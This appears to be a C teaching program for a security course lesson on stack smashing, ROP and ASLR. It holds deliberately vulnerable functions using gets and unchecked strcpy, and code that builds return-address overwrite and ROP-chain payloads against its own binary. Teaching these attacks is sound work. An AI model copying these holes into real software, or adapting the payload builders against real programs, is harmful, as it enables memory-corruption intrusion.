/*
 * Memory-Safety Attacks — Stack Smash, ROP, ASLR
 * Phase 12 — Cryptography & Security, Lesson 20
 *
 * COMPILATION (disable protections for educational demo):
 *   Stack smash:  gcc -fno-stack-protector -no-pie -z execstack -O0 -g -o exploit main.c
 *   ROP demo:     gcc -fno-stack-protector -no-pie -O0 -g -o exploit main.c
 *   Modern:       gcc -fstack-protector-strong -pie -fpie -Wl,-z,relro,-z,now -O2 -o exploit main.c
 *
 * WARNING: These programs intentionally introduce security vulnerabilities
 * for educational purposes. Do not run on production systems.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <inttypes.h>
#include <dlfcn.h>

/* ================================================================
 * Part 1: Stack Layout Viewer
 * ================================================================ */

__attribute__((noinline))
void print_stack_layout(void)
{
    char buf[64];
    uint64_t buf_addr = (uint64_t)buf;
    uint64_t *rbp;

    __asm__("movq %%rbp, %0" : "=r"(rbp));

    uint64_t saved_rbp_addr = (uint64_t)rbp;
    uint64_t ret_addr       = rbp[1];
    uint64_t ret_addr_loc   = (uint64_t)&rbp[1];

    printf("=== Stack Layout ===\n");
    printf("buf[64]          at 0x%012"PRIx64"\n", buf_addr);
    printf("saved RBP        at 0x%012"PRIx64" = 0x%012"PRIx64"\n",
           saved_rbp_addr, rbp[0]);
    printf("return address   at 0x%012"PRIx64" = 0x%012"PRIx64"\n",
           ret_addr_loc, ret_addr);
    printf("\n");

    ptrdiff_t offset = (ptrdiff_t)(ret_addr_loc - buf_addr);
    printf("Offset from buf[0] to return address: %td bytes\n", offset);
    printf("Offset from buf[0] to saved RBP:      %td bytes\n",
           (ptrdiff_t)(saved_rbp_addr - buf_addr));

    printf("Stack growth direction: ");
    {
        uint64_t dummy;
        uint64_t dummy_addr = (uint64_t)&dummy;
        if (dummy_addr < buf_addr)
            printf("downward (stack of print_stack_layout is below caller)\n");
        else
            printf("upward (unexpected)\n");
    }

    printf("Buffer alignment: buf %% 16 = %"PRId64"\n", buf_addr % 16);
    printf("RBP alignment:    rbp %% 16 = %"PRId64"\n", saved_rbp_addr % 16);
    printf("Ret addr align:   ret %% 16 = %"PRId64"\n", ret_addr_loc % 16);
    printf("\n");
}

/* ================================================================
 * Part 2: Vulnerable Functions
 * ================================================================ */

__attribute__((used))
static void win(const char *msg)
{
    printf("\n*** WIN! Control hijacked successfully! ***\n");
    if (msg) printf("*** Message: %s\n", msg);
    printf("***\n");
}

__attribute__((noinline))
static void vulnerable_gets(void)
{
    char buf[64];
    uint64_t *rbp;

    __asm__("movq %%rbp, %0" : "=r"(rbp));

    printf("--- vulnerable_gets() ---\n");
    printf("buf             at 0x%012"PRIx64"\n", (uint64_t)buf);
    printf("saved RBP       at 0x%012"PRIx64" = 0x%012"PRIx64"\n",
           (uint64_t)rbp, rbp[0]);
    printf("return address  at 0x%012"PRIx64" = 0x%012"PRIx64"\n",
           (uint64_t)&rbp[1], rbp[1]);
    printf("offset (buf->ret): %td bytes\n",
           (ptrdiff_t)((uint64_t)&rbp[1] - (uint64_t)buf));
    printf("win()           at 0x%012"PRIx64"\n", (uint64_t)win);
    printf("Enter input: ");

    fflush(stdout);
    gets(buf);

    printf("Returned from vulnerable_gets()\n");
}

__attribute__((noinline))
static void vulnerable_strcpy(const char *input)
{
    char buf[64];
    uint64_t *rbp;

    __asm__("movq %%rbp, %0" : "=r"(rbp));

    printf("--- vulnerable_strcpy() ---\n");
    printf("buf at 0x%012"PRIx64", input len = %zu\n",
           (uint64_t)buf, input ? strlen(input) : 0);
    printf("return addr at 0x%012"PRIx64"\n",
           (uint64_t)&rbp[1]);

    if (input)
        strcpy(buf, input);

    printf("Returned from vulnerable_strcpy()\n");
}

/* ================================================================
 * Part 3: Exploit Payload Generator
 * ================================================================ */

static void hex_dump(const char *label, const unsigned char *data, size_t len)
{
    printf("%s (%zu bytes):\n", label, len);
    for (size_t i = 0; i < len; i += 16) {
        printf("  %04zx:", i);
        for (size_t j = 0; j < 16 && i + j < len; j++)
            printf(" %02x", data[i + j]);
        printf("   ");
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            unsigned char c = data[i + j];
            printf("%c", (c >= 32 && c < 127) ? c : '.');
        }
        printf("\n");
    }
    printf("\n");
}

static size_t compute_offset(void)
{
    char buf[64];
    uint64_t *rbp;
    __asm__("movq %%rbp, %0" : "=r"(rbp));
    return (size_t)((uint64_t)&rbp[1] - (uint64_t)buf);
}

static void generate_smash_payload(void *target_addr)
{
    size_t offset = compute_offset();
    size_t payload_len = offset + 8;
    unsigned char *payload = calloc(payload_len, 1);

    memset(payload, 'A', offset);
    memcpy(payload + offset, &target_addr, 8);

    printf("=== Stack Smash Payload ===\n");
    printf("Offset to return address: %zu bytes\n", offset);
    printf("Target address (win):     0x%012"PRIx64"\n",
           (uint64_t)target_addr);
    printf("Payload size:             %zu bytes\n", payload_len);
    printf("Instructions:\n");
    printf("  echo -n '");
    for (size_t i = 0; i < payload_len; i++)
        printf("\\x%02x", payload[i]);
    printf("' | ./exploit\n");
    printf("  (or use the 'run-smash' Makefile target)\n\n");

    hex_dump("Smash payload", payload, payload_len);

    /* Also output raw bytes to stdout for piping */
    fwrite(payload, 1, payload_len, stdout);
    fflush(stdout);

    free(payload);
}

static void generate_rop_payload(void *win_addr, void *gadget_pop_rdi_ret,
                                 void *arg_addr)
{
    size_t offset = compute_offset();
    size_t chain_len = 3;
    size_t payload_len = offset + chain_len * 8;
    unsigned char *payload = calloc(payload_len, 1);
    unsigned char *chain = payload + offset;

    memset(payload, 'A', offset);

    /* ROP chain: [pop rdi; ret] [arg] [win] */
    memcpy(chain,      &gadget_pop_rdi_ret, 8);
    memcpy(chain + 8,  &arg_addr,            8);
    memcpy(chain + 16, &win_addr,            8);

    printf("=== ROP Chain Payload ===\n");
    printf("Offset to return address:   %zu bytes\n", offset);
    printf("pop_rdi_ret gadget:         0x%012"PRIx64"\n",
           (uint64_t)gadget_pop_rdi_ret);
    printf("Argument (rdi) address:     0x%012"PRIx64"\n",
           (uint64_t)arg_addr);
    printf("win() target:               0x%012"PRIx64"\n",
           (uint64_t)win_addr);
    printf("\n");
    printf("ROP chain layout:\n");
    printf("  [padding %zu bytes]\n", offset);
    printf("  [pop_rdi_ret      @ 0x%012"PRIx64"]\n",
           (uint64_t)gadget_pop_rdi_ret);
    printf("  [arg              @ 0x%012"PRIx64"]\n",
           (uint64_t)arg_addr);
    printf("  [win()            @ 0x%012"PRIx64"]\n",
           (uint64_t)win_addr);
    printf("\n");
    printf("Find your own gadgets with:\n");
    printf("  ROPgadget --binary exploit | grep 'pop rdi ; ret$'\n");
    printf("  objdump -d exploit | grep -A2 'pop.*rdi.*ret'\n");
    printf("  objdump -d exploit | grep -B1 'ret$' | grep 'pop'\n");
    printf("\n");
    printf("To find win() address:\n");
    printf("  nm exploit | grep win\n");
    printf("\n");

    hex_dump("ROP payload", payload, payload_len);

    fwrite(payload, 1, payload_len, stdout);
    fflush(stdout);

    free(payload);
}

/* ================================================================
 * Part 4: Self-Test — Show what happens with different protections
 * ================================================================ */

static void print_protection_status(void)
{
    printf("=== Protection Status ===\n");

#ifdef __SSP__
    printf("  Stack canary:  ENABLED  (-fstack-protector)\n");
#else
    printf("  Stack canary:  DISABLED (-fno-stack-protector)\n");
#endif

#ifdef __PIE__
    printf("  PIE:           ENABLED  (ASLR for executable)\n");
#else
    printf("  PIE:           DISABLED (-no-pie, fixed load address)\n");
#endif

    {
        FILE *maps = fopen("/proc/self/maps", "r");
        if (maps) {
            char line[256];
            int stack_exec = 0;
            while (fgets(line, sizeof(line), maps)) {
                if (strstr(line, "[stack]")) {
                    if (strstr(line, "rwxp") || strstr(line, "rwsp"))
                        stack_exec = 1;
                    break;
                }
            }
            fclose(maps);
            printf("  Stack NX:      %s\n",
                   stack_exec ? "DISABLED (stack is executable)"
                              : "ENABLED  (stack is non-executable)");
        }
    }

    printf("\n");
}

/* ================================================================
 * Part 5: ROP Gadget Finder Helper
 * ================================================================ */

static void find_csu_gadgets(void)
{
    printf("=== Common Gadget Locations (__libc_csu_init) ===\n");
    printf("Non-PIE binaries linked with glibc often have gadgets in\n");
    printf("__libc_csu_init. Look at the end of that function in objdump:\n");
    printf("  objdump -d exploit | grep -A50 '__libc_csu_init' | tail -30\n");
    printf("\n");
    printf("Typical gadgets found there:\n");
    printf("  pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret\n");
    printf("  pop rdi; ret\n");
    printf("  pop rsi; pop r15; ret\n");
    printf("  pop rdx; ret  (less common, may need libc instead)\n");
    printf("\n");
}

/* ================================================================
 * main — Demo Runner
 * ================================================================ */

int main(int argc, char **argv)
{
    printf("========================================\n");
    printf("  Memory-Safety Exploit Demonstration\n");
    printf("  Phase 12 — Cryptography & Security\n");
    printf("========================================\n\n");

    print_protection_status();
    print_stack_layout();

    printf("win() function address: %p\n\n", (void*)win);

    if (argc > 1) {
        if (strcmp(argv[1], "smash-payload") == 0) {
            generate_smash_payload((void*)win);
            return 0;
        }
        if (strcmp(argv[1], "rop-payload") == 0) {
            if (argc < 4) {
                printf("Usage: %s rop-payload <pop_rdi_ret_addr> <arg_addr>\n",
                       argv[0]);
                printf("Example: %s rop-payload 0x401023 0x402010\n",
                       argv[0]);
                printf("(Addresses from your specific binary)\n");
                printf("\nDemo with placeholder addresses:\n");
                void *placeholder_gadget = (void*)0xdeadbeef;
                void *placeholder_arg    = (void*)0xcafebabe;
                generate_rop_payload((void*)win,
                                     placeholder_gadget,
                                     placeholder_arg);
            } else {
                void *gadget = (void*)strtoull(argv[2], NULL, 16);
                void *arg    = (void*)strtoull(argv[3], NULL, 16);
                generate_rop_payload((void*)win, gadget, arg);
            }
            return 0;
        }
        if (strcmp(argv[1], "layout") == 0) {
            return 0;
        }
        if (strcmp(argv[1], "run-smash") == 0) {
            printf("Executing in stack-smash mode. Enter payload:\n");
            vulnerable_gets();
            return 0;
        }
        if (strcmp(argv[1], "run-rop") == 0) {
            printf("Executing in ROP mode. Enter payload:\n");
            vulnerable_gets();
            return 0;
        }
        if (strcmp(argv[1], "strcpy") == 0) {
            printf("Testing strcpy overflow.\n");
            vulnerable_strcpy(argv[2]);
            return 0;
        }
        if (strcmp(argv[1], "gadgets") == 0) {
            find_csu_gadgets();
            return 0;
        }
    }

    /* Default: print educational output */
    printf("--- Smash Payload Generation ---\n");
    generate_smash_payload((void*)win);

    printf("--- ROP Chain Generation (placeholder) ---\n");
    printf("Run '%s rop-payload <gadget> <arg>' with real addresses.\n",
           argv[0]);
    printf("Run '%s gadgets' for help finding gadgets.\n", argv[0]);
    printf("Run '%s run-smash' to test the stack smash in interactive mode.\n",
           argv[0]);
    printf("\n");

    printf("--- Additional Demos ---\n");
    printf("strcpy overflow test:  %s strcpy 'AAAA...'\n", argv[0]);

    return 0;
}
